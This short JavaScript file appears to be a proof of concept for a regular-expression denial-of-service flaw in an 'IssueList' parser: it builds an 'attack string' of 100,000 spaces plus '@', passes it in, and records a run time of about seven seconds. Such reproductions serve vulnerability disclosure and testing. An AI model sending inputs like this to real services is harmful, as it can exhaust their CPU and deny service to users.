import IssueList from "./IssueList.js";

// Attack String :""+" "*100000+"@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += " ";
}
str += "@";

var obj = {
  issues: str,
};
console.log(IssueList(obj));


// real    0m7.141s
// user    0m6.973s
// sys     0m0.030s